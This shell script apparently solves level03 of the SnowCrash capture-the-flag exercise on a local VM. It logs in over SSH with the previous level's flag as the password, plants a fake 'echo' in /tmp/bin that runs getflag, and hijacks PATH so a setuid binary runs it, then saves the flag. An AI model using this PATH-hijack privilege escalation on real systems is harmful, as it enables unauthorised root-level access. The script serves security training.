#! /usr/bin/env sh

CURR_FILE_PATH="$(realpath "$0")"
CURR_DIR_PATH="$(dirname "$CURR_FILE_PATH")"

#############
### UTILS ###
#############

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

###############
### VAGRANT ###
###############

assert_vagrant() {
    if ! command -v vagrant >/dev/null 2>&1; then
        log "Error: the 'vagrant' command is required. Considering installing the vagrant from https://www.vagrantup.com/downloads.";

        exit 1;
    fi
}

start_vagrant_ghidra_box() {
    assert_vagrant;

    vagrant_box_name="ghidra_box";
    ghidra_dir="${CURR_DIR_PATH}/ghidra";

    (
        cd "$ghidra_dir" || return 1;
        vagrant destroy -f || return 1;
        vagrant up --destroy-on-error --provision || return 1;
        vagrant halt || return 1;
        vagrant up --destroy-on-error || return 1;
    )

    return $?;
}

###########
### SSH ###
###########

get_ssh_socket_path() {
    fn_name="get_ssh_socket_path";
    socket_name="$1";

    if [ -z "$socket_name" ]; then
        log "Error: ${fn_name}: missing socket name" >&2;
        return 1;
    fi

    echo "${HOME}/.ssh/${socket_name}";
}

init_ssh_socket() {
    fn_name="init_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";
    password="$5";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ] || [ -z "$password" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username> <password>." >&2;
        return 1;
    fi

    if [ -S "$ssh_socket_path" ]; then
            if ssh -S "$ssh_socket_path" -O check "$host" -p "$port" >/dev/null 2>&1; then
                return 0;
            else
                rm -f "$ssh_socket_path";
            fi
    fi

    sshpass -p "$password" ssh -fNMS "$ssh_socket_path" -p "$port" "${username}@${host}"
    return $?;
}

close_ssh_socket() {
    fn_name="close_ssh_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    if ! [ -S "$ssh_socket_path" ]; then
        return 0;
    fi

    ssh -S "$ssh_socket_path" -O exit -p "$port" "${username}@${host}";
    exit_code=$?;
    rm -f "$ssh_socket_path";
    return $exit_code;
}

ssh_exec_via_socket() {
    fn_name="ssh_exec_via_socket";
    ssh_socket_path="$1";
    host="$2";
    port="$3";
    username="$4";

    if [ -z "$ssh_socket_path" ] || [ -z "$host" ] || [ -z "$port" ] || [ -z "$username" ]; then
        log "Error: ${fn_name}: missing arguments. You should provide <ssh_socket_path> <host> <port> <username>." >&2;
        return 1;
    fi

    shift 4;

    if [ $# -eq 0 ]; then
        return 0
    fi

    ssh -S "$ssh_socket_path" -p "$port" "$username@$host" "$@";
    return $?;
}

############
### MAIN ###
############

main() {
    host="localhost";
    port="4242"; # cf. port forwarding to VM 4242 => 4242.

    level03_socket_path=$(get_ssh_socket_path "snowcrash_level03_socket") || exit 1;
    level03_username="level03";
    level03_password=$(cat "$CURR_DIR_PATH/../../level02/flag");

    fake_bin_dir="/tmp/bin";
    fake_echo_bin="$fake_bin_dir/echo";

    init_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username" "$level03_password" || exit 1;
    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "mkdir -p '$fake_bin_dir'";
    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "echo 'getflag' > '$fake_echo_bin' && chmod +x '$fake_echo_bin'";
    checkflag=$(ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "PATH=$fake_bin_dir:$PATH /home/user/level03/level03" | head -n 1 | awk '{print $NF}');
    ssh_exec_via_socket "$level03_socket_path" "$host" "$port" "$level03_username" "rm -rf '$fake_bin_dir'";
    close_ssh_socket "$level03_socket_path" "$host" "$port" "$level03_username";

    flag_outpath="$CURR_DIR_PATH/../flag";
    echo "Checkflag: $checkflag";
    echo -n "$checkflag" > "$flag_outpath";
}

main "$@";
